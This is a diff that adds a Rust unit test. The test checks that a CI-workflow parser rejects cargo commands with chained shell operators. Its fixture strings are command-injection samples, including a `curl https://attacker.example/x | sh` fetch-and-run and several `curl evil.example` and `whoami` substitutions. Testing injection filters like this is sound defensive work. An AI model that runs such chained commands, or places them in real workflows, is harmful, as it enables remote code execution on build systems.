@@ -362,6 +362,60 @@ jobs:
 }
 
 #[test]
+fn shell_metacharacters_in_extracted_command_fall_back_to_none() {
+    // Security: a workflow `run:` line whose cargo invocation embeds
+    // shell control operators outside cargo's own argument grammar —
+    // `;`, `&&`, `||`, backticks, `$(`, an unbalanced quote — is either
+    // a hostile injection attempt or a non-cargo shell construct the
+    // gate cannot faithfully mirror. The parser must return None for
+    // such commands so the caller substitutes the operator-declared
+    // `[gates].*_flags` fallback. The shapes covered here all begin
+    // with a literal `cargo clippy ` / `cargo test ` and would extract
+    // verbatim without the rejection filter.
+    let cases: &[(&str, &str)] = &[
+        ("semicolon", "cargo clippy --all-targets ; curl https://attacker.example/x | sh"),
+        ("and_chain", "cargo clippy --all-targets && curl evil.example"),
+        ("or_chain", "cargo clippy --all-targets || curl evil.example"),
+        ("backtick", "cargo clippy --all-targets `whoami`"),
+        ("command_subst", "cargo clippy --all-targets $(whoami)"),
+        ("unbalanced_double_quote", "cargo clippy --all-targets \" ; curl evil"),
+        ("unbalanced_single_quote", "cargo clippy --all-targets ' ; curl evil"),
+    ];
+    for (label, clippy_line) in cases {
+        let tmp = TempDir::new().unwrap();
+        let body = format!(
+            r#"
+name: CI
+on: [push]
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - run: {}
+      - run: cargo test --all-targets --all-features
+"#,
+            clippy_line,
+        );
+        write_workflow(tmp.path(), "ci.yml", &body);
+        let extracted = parse_ci_workflow(tmp.path());
+        assert_eq!(
+            extracted.clippy, None,
+            "case {}: clippy line with shell metacharacters must be rejected, got {:?}",
+            label, extracted.clippy,
+        );
+        // The literal `cargo test` step is untouched, so it should
+        // still extract — proving the filter is per-command, not
+        // workflow-wide.
+        assert_eq!(
+            extracted.test.as_deref(),
+            Some("cargo test --all-targets --all-features"),
+            "case {}: clean `cargo test` step must still extract",
+            label,
+        );
+    }
+}
+
+#[test]
 fn extracted_commands_default_carries_fallback_provenance() {
     // The struct's defaults are useful for the workspace snapshot path:
     // when no workflow parsed and no fallback applied yet, both
